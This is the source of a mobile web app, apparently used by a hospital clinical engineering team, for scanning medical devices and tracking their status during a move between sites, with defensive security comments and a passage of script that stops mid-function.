<!DOCTYPE html>
<html lang="en-GB">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="theme-color" content="#173B5B">
<meta name="description" content="Scan medical devices during the Moorfields to Oriel move: instant move or do-not-move answer, destination, and one-tap status.">
<meta name="robots" content="noindex,nofollow">
<!-- Defence in depth. GitHub Pages cannot set response headers, so the policy lives here.
     What it buys: even with a script injection, the page cannot POST your session token
     to another host (connect-src), cannot be framed for clickjacking (frame-ancestors),
     cannot have its relative URLs hijacked (base-uri), and cannot submit a form off-site
     (form-action). script-src still needs 'unsafe-inline' because the app is one inline
     script with inline handlers; that is the honest limit of this approach. -->
<meta http-equiv="Content-Security-Policy" content="
  default-src 'none';
  script-src 'unsafe-inline';
  style-src 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src https://script.google.com https://*.googleusercontent.com;
  form-action 'none';
  base-uri 'none';
  frame-ancestors 'none';
  object-src 'none'">
<meta name="referrer" content="no-referrer">
<title>Oriel Move — Clinical Engineering</title>
<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 40 40'%3E%3Crect width='40' height='40' fill='%23173B5B'/%3E%3Cg fill='%23DDE460'%3E%3Ccircle cx='20' cy='5' r='2.4'/%3E%3Ccircle cx='30.6' cy='9.4' r='2.4'/%3E%3Ccircle cx='35' cy='20' r='2.4'/%3E%3Ccircle cx='30.6' cy='30.6' r='2.4'/%3E%3Ccircle cx='20' cy='35' r='2.4'/%3E%3Ccircle cx='9.4' cy='30.6' r='2.4'/%3E%3Ccircle cx='5' cy='20' r='2.4'/%3E%3Ccircle cx='9.4' cy='9.4' r='2.4'/%3E%3C/g%3E%3Ccircle cx='20' cy='20' r='6.4' fill='%233F8CA6'/%3E%3C/svg%3E">
<style>
:root{
  --navy:#173B5B; --navy-d:#0F2B44; --navy-l:#264065;
  --indigo:#353575; --teal:#3F8CA6; --lime:#DDE460; --magenta:#88398A;
  --go:#00703C; --go-d:#00522C; --stop:#A4262C; --stop-d:#7D1B21; --hold:#8A5A00;
  --paper:#FBFBFB; --card:#FFFFFF; --line:#DCE3E9; --line-2:#EDF1F4;
  --ink:#12283C; --muted:#5C6F80;
  --sp:16px; --r:4px;
  --font:"Segoe UI",system-ui,-apple-system,Roboto,Arial,sans-serif;
}
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{margin:0;padding:0}
body{
  font-family:var(--font); background:var(--paper); color:var(--ink);
  font-size:16px; line-height:1.45; overscroll-behavior-y:none;
  padding-bottom:calc(64px + env(safe-area-inset-bottom));
}
h1,h2,h3{margin:0;font-weight:700;letter-spacing:-.02em;line-height:1.2}
button,input,select,textarea{font:inherit;color:inherit}
button{cursor:pointer;border:0;background:none}
a{color:var(--teal)}
.tnum{font-variant-numeric:tabular-nums}
.hide{display:none !important}

/* ---------- app bar ---------- */
.appbar{background:var(--navy);color:#fff;padding:calc(10px + env(safe-area-inset-top)) var(--sp) 0;position:sticky;top:0;z-index:40}
.appbar-top{display:flex;align-items:center;gap:10px;padding-bottom:10px}
.mark{width:30px;height:30px;flex:0 0 30px}
.wordmark{font-weight:700;font-size:19px;letter-spacing:-.02em}
.wordmark span{font-weight:400;opacity:.72;border-left:1px solid rgba(255,255,255,.35);margin-left:9px;padding-left:9px;font-size:13px;letter-spacing:0}
.appbar-actions{margin-left:auto;display:flex;gap:8px;align-items:center}
.iconbtn{width:36px;height:36px;border-radius:var(--r);display:grid;place-items:center;color:#fff;background:rgba(255,255,255,.09)}
.iconbtn:active{background:rgba(255,255,255,.2)}
.statusband{background:var(--navy-l);margin:0 calc(var(--sp) * -1);padding:7px var(--sp);display:flex;align-items:center;gap:8px;font-size:12.5px;color:#D6E2EC;white-space:nowrap;overflow:hidden}
.statusband .pill{flex:0 0 auto}
#bandMeta{overflow:hidden;text-overflow:ellipsis}
.pill{display:inline-flex;align-items:center;gap:6px;padding:2px 9px;border-radius:99px;font-weight:600;font-size:11.5px;letter-spacing:.02em}
.pill.on{background:rgba(221,228,96,.16);color:var(--lime)}
.pill.off{background:rgba(255,255,255,.14);color:#fff}
.pill.queue{background:var(--lime);color:var(--navy-d)}
.dot{width:7px;height:7px;border-radius:99px;background:currentColor}

/* ---------- layout ---------- */
main{padding:var(--sp);max-width:760px;margin:0 auto}
.screen{display:none}
.screen.active{display:block;animation:fade .18s ease-out}
@keyframes fade{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}
.eyebrow{font-size:11.5px;font-weight:700;letter-spacing:.09em;text-transform:uppercase;color:var(--muted);margin:0 0 8px}
.card{background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:var(--sp);margin-bottom:12px}
.card.tight{padding:12px}
.card-h{display:flex;align-items:baseline;gap:10px;margin-bottom:12px}
.card-h h2{font-size:17px}
.card-h .more{margin-left:auto;font-size:13px;color:var(--teal);font-weight:600}

/* ---------- buttons ---------- */
.btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;padding:13px 18px;border-radius:var(--r);font-weight:600;font-size:15.5px;border:1px solid transparent;width:100%;min-height:48px;text-align:center}
.btn:active{transform:translateY(1px)}
.btn-primary{background:var(--indigo);color:#fff}
.btn-teal{background:var(--teal);color:#fff}
.btn-go{background:var(--go);color:#fff;font-size:17px}
.btn-ghost{background:#fff;color:var(--navy);border-color:var(--navy);}
.btn-quiet{background:var(--line-2);color:var(--ink);border-color:var(--line)}
.btn-danger{background:#fff;color:var(--stop);border-color:var(--stop)}
.btn-row{display:flex;gap:10px}
.btn-row .btn{width:auto;flex:1}
.btn[disabled]{opacity:.45;pointer-events:none}

/* ---------- scan ---------- */
.scanwrap{background:var(--navy);border-radius:var(--r);padding:18px;color:#fff;margin-bottom:14px}
.scanwrap h2{font-size:20px;margin-bottom:4px}
.scanwrap p{margin:0 0 14px;font-size:13.5px;color:#B9CCDA}
.scanfield{display:flex;gap:8px}
.scanfield input{flex:1;min-width:0;padding:14px;border-radius:var(--r);border:2px solid transparent;background:#fff;color:var(--ink);font-size:19px;font-weight:600;letter-spacing:.04em}
.scanfield input:focus{outline:0;border-color:var(--lime)}
.scanfield button{flex:0 0 auto;padding:0 18px;background:var(--indigo);color:#fff;border-radius:var(--r);font-weight:600}
#cam{width:100%;border-radius:var(--r);background:#000;display:block;aspect-ratio:4/3;object-fit:cover;margin-bottom:10px}
.camframe{position:relative}
.reticle{position:absolute;inset:18% 10%;border:2px solid var(--lime);border-radius:6px;box-shadow:0 0 0 100vmax rgba(15,43,68,.35);pointer-events:none}
.recent{display:flex;gap:8px;overflow-x:auto;padding-bottom:4px;-webkit-overflow-scrolling:touch}
.recent button{flex:0 0 auto;background:#fff;border:1px solid var(--line);border-radius:99px;padding:7px 13px;font-size:13px;font-weight:600;color:var(--navy)}

/* ---------- verdict slab (signature) ---------- */
.slab{border-radius:var(--r);padding:26px 20px 22px;color:#fff;margin:0 0 12px;position:relative;overflow:hidden}
.slab::after{content:"";position:absolute;right:-40px;top:-40px;width:190px;height:190px;border-radius:50%;background:rgba(255,255,255,.07)}
.slab .verdict-label{font-size:11.5px;font-weight:700;letter-spacing:.14em;text-transform:uppercase;opacity:.85}
.slab .verdict{font-size:clamp(38px,12.5vw,60px);font-weight:800;letter-spacing:-.035em;line-height:.94;margin:8px 0 0}
.slab .verdict-sub{margin:14px 0 0;font-size:15px;opacity:.95;position:relative}
.slab.move{background:var(--go)}
.slab.nomove{background:var(--stop)}
.slab.unsure{background:var(--hold)}
.slab.unknown{background:var(--navy-l)}
.dest{margin-top:16px;background:rgba(0,0,0,.22);border-radius:var(--r);padding:14px;position:relative}
.dest .dl{font-size:11px;letter-spacing:.12em;text-transform:uppercase;opacity:.8;font-weight:700}
.dest .dv{font-size:26px;font-weight:800;letter-spacing:-.02em;line-height:1.15;margin-top:3px}
.dest .dv.missing{font-size:18px;font-weight:700;color:var(--lime)}
.slabflags{display:flex;flex-wrap:wrap;gap:6px;margin-top:12px;position:relative}
.flag{background:rgba(255,255,255,.18);border-radius:3px;padding:4px 9px;font-size:12px;font-weight:600}

/* ---------- asset detail ---------- */
.idrow{display:flex;gap:12px;align-items:flex-start;margin-bottom:4px}
.idrow h1{font-size:22px}
.assetno{font-size:13px;color:var(--muted);font-weight:600;letter-spacing:.03em}
dl.kv{margin:0;display:grid;grid-template-columns:132px 1fr;gap:0}
dl.kv dt{padding:9px 0;font-size:12.5px;color:var(--muted);border-top:1px solid var(--line-2);font-weight:600}
dl.kv dd{padding:9px 0;margin:0;font-size:14.5px;border-top:1px solid var(--line-2);word-break:break-word}
dl.kv dt:first-of-type,dl.kv dd:first-of-type{border-top:0}
.chips{display:flex;flex-wrap:wrap;gap:7px}
.chip{border:1px solid var(--line);background:#fff;border-radius:99px;padding:8px 14px;font-size:13.5px;font-weight:600;color:var(--navy)}
.chip.sel{background:var(--navy);border-color:var(--navy);color:#fff}
.chip.sm{padding:5px 10px;font-size:12px}

/* ---------- status pipeline ---------- */
.pipe{display:flex;gap:3px;margin-bottom:14px}
.pipe i{flex:1;height:6px;border-radius:2px;background:var(--line);font-style:normal}
.pipe i.done{background:var(--go)}
.pipe i.blocked{background:var(--stop)}
.statnow{display:flex;align-items:center;gap:9px;margin-bottom:12px}
.statnow b{font-size:17px}

/* ---------- dashboard ---------- */
.stats{display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin-bottom:12px}
.stat{background:#fff;border:1px solid var(--line);border-radius:var(--r);padding:14px}
.stat .n{font-size:29px;font-weight:800;letter-spacing:-.03em;line-height:1}
.stat .l{font-size:12px;color:var(--muted);margin-top:5px;font-weight:600}
.stat.hero{grid-column:1/-1;background:var(--navy);border-color:var(--navy);color:#fff}
.stat.hero .l{color:#B9CCDA}
.stat.hero .n{font-size:34px}
.bigbar{height:12px;border-radius:2px;background:rgba(255,255,255,.18);margin-top:12px;overflow:hidden;display:flex}
.bigbar u{display:block;height:100%;text-decoration:none}
.bigbar u.d{background:var(--lime)}
.bigbar u.p{background:var(--teal)}
.legend{display:flex;gap:14px;margin-top:9px;font-size:11.5px;color:#B9CCDA;flex-wrap:wrap}
.legend b{display:inline-block;width:9px;height:9px;border-radius:2px;margin-right:5px;vertical-align:baseline}
.deptrow{padding:11px 0;border-top:1px solid var(--line-2)}
.deptrow:first-child{border-top:0}
.deptrow .t{display:flex;gap:10px;font-size:14px;align-items:baseline}
.deptrow .t b{font-weight:600}
.deptrow .t span{margin-left:auto;font-size:12.5px;color:var(--muted);font-weight:600;flex:0 0 auto}
.bar{height:8px;border-radius:2px;background:var(--line);margin-top:7px;overflow:hidden;display:flex}
.bar u{display:block;height:100%;text-decoration:none}
.bar u.done{background:var(--go)}
.bar u.prog{background:var(--teal)}
.bar u.blk{background:var(--stop)}

/* ---------- list / search ---------- */
.searchbar{display:flex;gap:8px;margin-bottom:10px}
.searchbar input{flex:1;min-width:0;padding:12px 13px;border:1px solid var(--line);border-radius:var(--r);background:#fff}
.searchbar input:focus{outline:2px solid var(--teal);outline-offset:-1px}
.filters{display:flex;gap:7px;overflow-x:auto;padding-bottom:9px;margin-bottom:4px}
.filters select{flex:0 0 auto;padding:8px 11px;border:1px solid var(--line);border-radius:99px;background:#fff;font-size:13px;font-weight:600;color:var(--navy);max-width:46vw}
.res{background:#fff;border:1px solid var(--line);border-radius:var(--r);padding:12px 13px;margin-bottom:8px;display:flex;gap:12px;align-items:center;width:100%;text-align:left}
.res .flagbar{width:4px;align-self:stretch;border-radius:2px;flex:0 0 4px}
.res .body{min-width:0;flex:1;display:block}
.res .l1,.res .l2{display:block}
.res .l1{font-weight:700;font-size:15px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.res .l2{font-size:12.5px;color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-top:2px}
.res .tag{flex:0 0 auto;font-size:10.5px;font-weight:700;letter-spacing:.05em;padding:3px 7px;border-radius:3px;text-transform:uppercase}
.count{font-size:12.5px;color:var(--muted);margin:2px 0 10px;font-weight:600}

/* ---------- audit ---------- */
.aud{padding:11px 0;border-top:1px solid var(--line-2);font-size:13.5px}
.aud:first-child{border-top:0}
.aud .w{color:var(--muted);font-size:11.5px;font-weight:600;letter-spacing:.02em}
.aud .f{font-weight:700}
.aud .chg{margin-top:3px}
.aud del{color:var(--stop);text-decoration:line-through;opacity:.8}
.aud ins{color:var(--go);text-decoration:none;font-weight:600}

/* ---------- forms ---------- */
label.fld{display:block;margin-bottom:14px}
label.fld .lb{font-size:12.5px;font-weight:700;color:var(--muted);display:block;margin-bottom:5px}
label.fld input,label.fld select,label.fld textarea{width:100%;padding:12px;border:1px solid var(--line);border-radius:var(--r);background:#fff}
label.fld input:focus,label.fld select:focus,label.fld textarea:focus{outline:2px solid var(--teal);outline-offset:-1px}
.was{font-size:11.5px;color:var(--muted);margin-top:4px}

/* ---------- sheets / toast ---------- */
.scrim{position:fixed;inset:0;background:rgba(15,43,68,.5);z-index:60;display:none}
.scrim.on{display:block}
.sheet{position:fixed;left:0;right:0;bottom:0;z-index:61;background:#fff;border-radius:12px 12px 0 0;padding:18px var(--sp) calc(20px + env(safe-area-inset-bottom));transform:translateY(102%);transition:transform .22s ease;max-height:88vh;overflow:auto}
.sheet.on{transform:none}
.sheet h2{font-size:18px;margin-bottom:4px}
.sheet .sub{font-size:13.5px;color:var(--muted);margin:0 0 16px}
.grab{width:38px;height:4px;background:var(--line);border-radius:9px;margin:-6px auto 14px}
.toast{position:fixed;left:50%;bottom:calc(78px + env(safe-area-inset-bottom));transform:translate(-50%,20px);background:var(--navy-d);color:#fff;padding:11px 18px;border-radius:var(--r);font-size:14px;font-weight:600;z-index:70;opacity:0;transition:.2s;pointer-events:none;max-width:90vw;text-align:center}
.toast.on{opacity:1;transform:translate(-50%,0)}

/* ---------- tab bar ---------- */
.tabs{position:fixed;left:0;right:0;bottom:0;z-index:50;background:#fff;border-top:1px solid var(--line);display:grid;grid-template-columns:repeat(4,1fr);padding-bottom:env(safe-area-inset-bottom)}
.tabs button{padding:8px 0 9px;display:grid;justify-items:center;gap:3px;font-size:10.5px;font-weight:600;color:var(--muted);position:relative}
.tabs button.on{color:var(--navy)}
.tabs button.on::before{content:"";position:absolute;top:0;left:22%;right:22%;height:3px;background:var(--lime);border-radius:0 0 3px 3px}
.tabs svg{width:22px;height:22px}
.banner{background:var(--lime);color:var(--navy-d);padding:11px 13px;border-radius:var(--r);font-size:13.5px;font-weight:600;margin-bottom:12px;display:flex;gap:10px;align-items:center}
.banner button{margin-left:auto;flex:0 0 auto;font-weight:700;text-decoration:underline;color:var(--navy-d);font-size:13px}
.empty{text-align:center;padding:44px 20px;color:var(--muted)}
.empty h3{font-size:16px;color:var(--ink);margin-bottom:6px}
.spin{width:30px;height:30px;border:3px solid var(--line);border-top-color:var(--teal);border-radius:99px;animation:sp .7s linear infinite;margin:0 auto 14px}
@keyframes sp{to{transform:rotate(360deg)}}
@media (prefers-reduced-motion:reduce){*{animation-duration:.001ms !important;transition-duration:.001ms !important}}
@media (min-width:700px){.stats{grid-template-columns:repeat(4,1fr)}}
:focus-visible{outline:3px solid var(--lime);outline-offset:2px}
/* ---------- view mode / edit mode ---------- */
.lockbtn{display:inline-flex;align-items:center;gap:6px;height:34px;padding:0 11px;border-radius:var(--r);
  background:rgba(255,255,255,.1);color:#fff;font-size:12.5px;font-weight:700;letter-spacing:.01em;white-space:nowrap}
.lockbtn svg{width:15px;height:15px;flex:0 0 15px}
.lockbtn.open{background:var(--lime);color:var(--navy-d)}
.lockbtn:active{opacity:.8}
.viewnote{background:#EDF1F4;border:1px solid var(--line);border-radius:var(--r);
  padding:12px 13px;margin-bottom:12px;font-size:13.5px;color:var(--muted);display:flex;gap:11px;align-items:center}
.viewnote svg{width:17px;height:17px;flex:0 0 17px;color:var(--navy)}
.viewnote button{margin-left:auto;flex:0 0 auto;font-weight:700;color:var(--indigo);text-decoration:underline;font-size:13px}
.keyin{letter-spacing:.16em !important;font-weight:700 !important;font-size:19px !important;text-align:center;text-transform:uppercase}
.err{background:#F6DCDD;border:1px solid #E0AFB2;color:var(--stop-d);border-radius:var(--r);
  padding:10px 12px;font-size:13.5px;font-weight:600;margin-bottom:12px}

/* ---------- sync ---------- */
.pill.sync{background:var(--teal);color:#fff}
.pill.err{background:#F6DCDD;color:var(--stop-d)}
.syncrow{display:flex;align-items:center;gap:10px;font-size:13.5px;padding:9px 0;border-top:1px solid var(--line-2)}
.syncrow:first-child{border-top:0}
.syncrow .s{margin-left:auto;font-weight:700;font-size:12px;color:var(--muted)}

/* ---------- add asset ---------- */
.fab{position:fixed;right:16px;bottom:calc(78px + env(safe-area-inset-bottom));z-index:45;
  width:56px;height:56px;border-radius:50%;background:var(--indigo);color:#fff;
  display:grid;place-items:center;box-shadow:0 3px 12px rgba(15,43,68,.3)}
.fab svg{width:26px;height:26px}
.fab:active{transform:scale(.94)}
.fieldgrid{display:grid;grid-template-columns:1fr 1fr;gap:0 12px}
.fieldgrid .full{grid-column:1/-1}
details.more{margin:0 0 14px}
details.more summary{font-size:13px;font-weight:700;color:var(--indigo);cursor:pointer;padding:8px 0;list-style:none}
details.more summary::-webkit-details-marker{display:none}
details.more summary::before{content:"+ ";font-weight:800}
details.more[open] summary::before{content:"− "}

/* ---------- misc ---------- */
.linkrow{display:flex;align-items:center;gap:10px;padding:13px 0;border-top:1px solid var(--line-2);
  font-size:14.5px;font-weight:600;color:var(--navy);width:100%;text-align:left}
.linkrow:first-child{border-top:0}
.linkrow .arw{margin-left:auto;color:var(--muted)}
code.k{font-family:ui-monospace,Menlo,Consolas,monospace;background:var(--line-2);
  padding:2px 6px;border-radius:3px;font-size:12.5px;word-break:break-all}
.skel{background:linear-gradient(90deg,var(--line-2),#fff,var(--line-2));background-size:200% 100%;
  animation:sk 1.2s linear infinite;border-radius:3px;height:14px}
@keyframes sk{to{background-position:-200% 0}}

/* ---------- model photos ---------- */
/* contain, not cover. Medical device shots are tall portraits on a white background —
   cover crops the head or the base off exactly the part you need to recognise it. */
.photo{display:block;width:100%;height:auto;max-height:300px;object-fit:contain;
  border-radius:var(--r);border:1px solid var(--line);background:#fff;padding:10px;cursor:zoom-in}
.photo.tall{max-height:64vh;padding:0;border:0;cursor:default}
.photo.broken{display:none}
.photocap{font-size:12px;color:var(--muted);margin:7px 0 14px;font-weight:600}
.photocap button{color:var(--indigo);text-decoration:underline;font-weight:700;font-size:12px}
.res .thumb{flex:0 0 42px;width:42px;height:42px;border-radius:3px;object-fit:contain;
  background:#fff;border:1px solid var(--line);padding:2px}

/* Bottom-of-page return. The one at the top scrolls away on a long asset, and on a
   phone the thumb is at the bottom of the screen anyway. */
.scanback{display:flex;align-items:center;justify-content:center;gap:9px;width:100%;
  min-height:52px;margin:4px 0 20px;padding:14px;border-radius:var(--r);
  background:var(--navy);color:#fff;font-weight:700;font-size:16px}
.scanback:active{background:var(--navy-d)}
.scanback svg{width:19px;height:19px}

/* ---------- batch scanning ---------- */
.batchbar{display:flex;align-items:center;gap:10px;background:var(--lime);color:var(--navy-d);
  border-radius:var(--r);padding:12px 14px;margin-bottom:12px;font-weight:700;font-size:14px}
.batchbar .n{font-size:24px;letter-spacing:-.02em;line-height:1}
.batchbar button{margin-left:auto;flex:0 0 auto;font-weight:700;font-size:13px;
  text-decoration:underline;color:var(--navy-d)}
.batchlist{max-height:46vh;overflow:auto;-webkit-overflow-scrolling:touch;margin-bottom:12px}
.brow{display:flex;align-items:center;gap:10px;padding:9px 0;border-top:1px solid var(--line-2)}
.brow:first-child{border-top:0}
.brow .bar{width:4px;align-self:stretch;border-radius:2px;flex:0 0 4px;height:auto;background:var(--go);margin:0}
.brow .b{min-width:0;flex:1}
.brow .b1{font-size:14px;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.brow .b2{font-size:11.5px;color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.brow .x{flex:0 0 auto;width:30px;height:30px;border-radius:var(--r);display:grid;place-items:center;
  color:var(--muted);font-size:19px;line-height:1}
.brow.bad .b1{color:var(--stop)}
.brow.bad .bar{background:var(--stop)}
.batchtarget{display:flex;gap:8px;margin-bottom:10px}
.batchtarget button{flex:1;padding:12px 6px;border-radius:var(--r);border:1px solid var(--line);
  background:#fff;font-weight:700;font-size:13.5px;color:var(--navy);min-height:52px}
.batchtarget button.sel{background:var(--navy);border-color:var(--navy);color:#fff}
.bwarn{background:#FFF6D9;border:1px solid #E6D08A;color:#6B5200;border-radius:var(--r);
  padding:10px 12px;font-size:13px;font-weight:600;margin-bottom:10px}

</style>
</head>
<body>
<header class="appbar">
  <div class="appbar-top">
    <svg class="mark" viewBox="0 0 40 40" aria-hidden="true">
      <g fill="#DDE460">
        <circle cx="20" cy="5" r="2.4"/><circle cx="30.6" cy="9.4" r="2.4"/><circle cx="35" cy="20" r="2.4"/>
        <circle cx="30.6" cy="30.6" r="2.4"/><circle cx="20" cy="35" r="2.4"/><circle cx="9.4" cy="30.6" r="2.4"/>
        <circle cx="5" cy="20" r="2.4"/><circle cx="9.4" cy="9.4" r="2.4"/>
      </g>
      <circle cx="20" cy="20" r="6.4" fill="#3F8CA6"/>
    </svg>
    <div class="wordmark">Oriel Move</div>
    <div class="appbar-actions">
      <button class="lockbtn" id="lockBtn" aria-label="Editing mode">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" id="lockIcon">
          <rect x="5" y="11" width="14" height="9" rx="1.6"/><path d="M8 11V7.5a4 4 0 018 0V11"/>
        </svg><span id="lockLabel">View only</span>
      </button>
    </div>
  </div>
  <div class="statusband">
    <span class="pill on" id="netPill"><i class="dot"></i> Online</span>
    <span class="pill sync hide" id="queuePill">0 queued</span>
    <span id="bandMeta" style="margin-left:auto"></span>
  </div>
</header>

<main>
  <section class="screen active" id="s-scan">
    <div class="scanwrap">
      <h2>Scan an asset</h2>
      <p>Point the camera at the asset barcode, use a handheld scanner, or type the equipment number.</p>
      <div class="scanfield">
        <input id="scanInput" inputmode="numeric" autocomplete="off" enterkeyhint="search"
               placeholder="Equipment or serial no." aria-label="Equipment or serial number">
        <button id="scanGo">Find</button>
      </div>
      <div style="margin-top:10px" id="camHost">
        <button class="btn btn-teal" id="btnCam">Use camera</button>
      </div>
      <div style="margin-top:10px">
        <button class="chip sm" id="btnWedge" style="background:rgba(255,255,255,.12);border-color:rgba(255,255,255,.3);color:#fff">Handheld scanner</button>
        <button class="chip sm" id="btnBatch" style="background:rgba(255,255,255,.12);border-color:rgba(255,255,255,.3);color:#fff">Batch mode</button>
      </div>
    </div>
    <div id="batchPanel" class="hide"></div>
    <div id="recentWrap" class="hide">
      <p class="eyebrow">Recently scanned</p>
      <div class="recent" id="recent"></div>
    </div>
    <div class="card tight">
      <div class="card-h"><h2>Today</h2><button class="more" data-goto="dash">Full dashboard</button></div>
      <div class="stats" id="todayStats"></div>
    </div>
  </section>

  <section class="screen" id="s-asset"></section>

  <section class="screen" id="s-find">
    <div class="searchbar">
      <input id="q" type="search" placeholder="Search asset no, serial, model, location" aria-label="Search">
    </div>
    <div class="filters" id="filters"></div>
    <p class="count" id="findCount"></p>
    <div id="findResults"></div>
  </section>

  <section class="screen" id="s-dash"></section>
  <section class="screen" id="s-data"></section>
</main>

<button class="fab hide" id="fab" aria-label="Add an asset">
  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M12 5v14M5 12h14"/></svg>
</button>

<nav class="tabs" role="tablist">
  <button data-goto="scan" class="on"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 8V5a2 2 0 012-2h3M16 3h3a2 2 0 012 2v3M21 16v3a2 2 0 01-2 2h-3M8 21H5a2 2 0 01-2-2v-3M3 12h18"/></svg>Scan</button>
  <button data-goto="find"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="M20 20l-4-4"/></svg>Find</button>
  <button data-goto="dash"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 20V10M10 20V4M16 20v-7M22 20H2"/></svg>Progress</button>
  <button data-goto="data"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><ellipse cx="12" cy="6" rx="8" ry="3"/><path d="M4 6v6c0 1.7 3.6 3 8 3s8-1.3 8-3V6M4 12v6c0 1.7 3.6 3 8 3s8-1.3 8-3v-6"/></svg>Data</button>
</nav>

<div class="scrim" id="scrim"></div>
<div class="sheet" id="sheet"><div class="grab"></div><div id="sheetBody"></div></div>
<div class="toast" id="toast" role="status" aria-live="polite"></div>

<script>
"use strict";
/* =====================================================================================
   Oriel Move — static client for GitHub Pages
   Database: a Google Sheet.  API: an Apps Script web app (see apps-script/Code.gs).
   This file never talks to the sheet directly and never checks the master key itself.
   ===================================================================================== */

/* ─────────────────────────── configure this ─────────────────────────── */
const CONFIG = {
  /* The Apps Script deployment this site talks to. Baked in, so any device that opens
     the page is connected immediately — nothing to paste, nothing to set up.

     Pinned on purpose: when this is set it OVERRIDES anything in localStorage, so
     nothing running in the browser can redirect the next unlock to somewhere else and
     collect the master key as it is typed. See SECURITY.md.

     Changing deployment? Publish a NEW VERSION of the existing deployment instead —
     that keeps this URL working. "New deployment" issues a different URL and you would
     have to edit this line and re-push. */
  API_URL: 'https://script.google.com/macros/s/AKfycbyvz06N0Nh5AtcrKpDRxO6B3ZVtnEP2f0UdfRIN6h8XDzZGDOUXyVkZ0t1BduPKSWSdZw/exec',
  ORG: 'Moorfields Eye Hospital NHS Foundation Trust'
};
/* ─────────────────────────────────────────────────────────────────────── */

const KEY = {
  id:'Equipment No', serial:'Serial No', brand:'Brand', model:'Model', cat:'Category',
  site:'Site', from:'Current Location', floor:'New Floor', to:'New Location',
  service:'SERVICE', verdict:'Transfer to Oriel?', notes:'Notes', status:'Status',
  handling:'Pre Move -   Handheld, Wheels ,Fixed, Desktop',
  transport:'Move -  Physical transport (Mover / OEM / Internal) ',
  fragility:'Move - Physical transport (complex / fragile/ None)',
  deps:'Dependancies', conn:'Connectivity Required?', ict:'ICT Interfaces',
  oem:'OEM Provider', oemTest:'OEM Testing Required?',
  preReq:'Pre transfer requirements', postReq:'Post transfer requirements',
  stage:'Move Status', movedAt:'Moved At', movedBy:'Moved By', issue:'Issue'
};
const STAGES = ['Not started','In transit','Installed'];
/* Values written by the earlier six-stage version, or typed by hand into the sheet. */
const LEGACY_STAGE = {
  'prepped':'Not started', 'delivered':'In transit', 'verified':'Installed',
  'complete':'Installed', 'completed':'Installed', 'done':'Installed'
};

/* Fields an unlocked editor may change. Must match EDITABLE in Code.gs — the server
   rejects anything else, this list only decides what the form offers. */
const EDITABLE = [KEY.verdict, KEY.floor, KEY.to, KEY.service, KEY.handling,
                  KEY.transport, KEY.fragility, KEY.deps, KEY.conn, KEY.ict,
                  KEY.oem, KEY.oemTest, KEY.notes];

let COLS = [], ASSETS = new Map(), SERIALS = new Map();
/* One photo per MODEL, not per asset — 436 models across 2,876 assets, so a picture of
   "Pentacam HR" earns its keep on every Pentacam HR in the building. */
let PHOTOS = {};
/* Only https images are ever rendered. A stored javascript:, data: or blob: URL would
   otherwise be a stored-XSS vector the moment someone taps the picture. */
const safeImg = u => /^https:\/\//i.test(t(u)) ? t(u) : '';
const photoFor = r => {
  const p = PHOTOS[t(r[KEY.model]).toLowerCase()];
  return (p && safeImg(p.url)) ? { ...p, url: safeImg(p.url) } : null;
};
let REV = '0', recent = [], apiUrl = '', sheetId = '';
/* Result of the last health check. When the back end is not ready, the app says so
   loudly rather than quietly serving the bundled snapshot as though it were live. */
let HEALTH = null;
let usingSnapshot = true;
let route = 'scan', currentAsset = null, wedge = false, findLimit = 60;
/* Batch scanning. `batch` holds ids only — models and statuses are read live, so the
   list never shows a stale status after a sync. Persisted, because losing forty scans
   to a dropped phone is the whole reason people go back to paper. */
let batchMode = false, batch = [], batchTarget = 'In transit', lastScan = { code:'', at:0 };

/* ══════════════════════════════ session ══════════════════════════════
   The unlock lives in sessionStorage. That means: it survives a page refresh and
   navigating around the app, and it is gone the moment the tab is closed. Nothing
   about the key is ever written to disk, and closing the tab is the way to hand the
   device to someone else. */
const SESSION_KEY = 'oriel.session';
/* What is held here is a session TOKEN issued by Apps Script, not the master key. The
   key is typed once, sent once, and never stored. A stolen token expires in six hours
   and can be killed server-side with revokeAllSessions(). */
let session = null;
function loadSession(){
  try { session = JSON.parse(sessionStorage.getItem(SESSION_KEY) || 'null'); }
  catch { session = null; }
}
function saveSession(s){
  session = s;
  if (s) sessionStorage.setItem(SESSION_KEY, JSON.stringify(s));
  else sessionStorage.removeItem(SESSION_KEY);
  paintLock();
}
const cred = () => session && (session.token || session.key);
/* When the deployment allows keyless batch updates, anyone can advance a status —
   they just have to say who they are, so the audit log is never anonymous. */
const openBatch = () => !!(HEALTH && HEALTH.openBatch);
const canBatch  = () => canStatus() || openBatch();
const whoAmI    = () => (session && session.name) || t(localStorage.getItem('oriel.name'));
const canEdit   = () => !!(session && session.canEdit);
const canStatus = () => !!(session && session.canStatus);

/* ══════════════════════════════ storage ══════════════════════════════ */
const DB = (()=>{
  let db;
  const open = () => new Promise((res,rej)=>{
    const r = indexedDB.open('oriel-move', 2);
    r.onupgradeneeded = e => {
      const d = e.target.result;
      if(!d.objectStoreNames.contains('assets')) d.createObjectStore('assets',{keyPath:'_id'});
      if(!d.objectStoreNames.contains('queue'))  d.createObjectStore('queue',{keyPath:'clientId'});
      if(!d.objectStoreNames.contains('meta'))   d.createObjectStore('meta',{keyPath:'k'});
    };
    r.onsuccess = e => { db = e.target.result; res(db); };
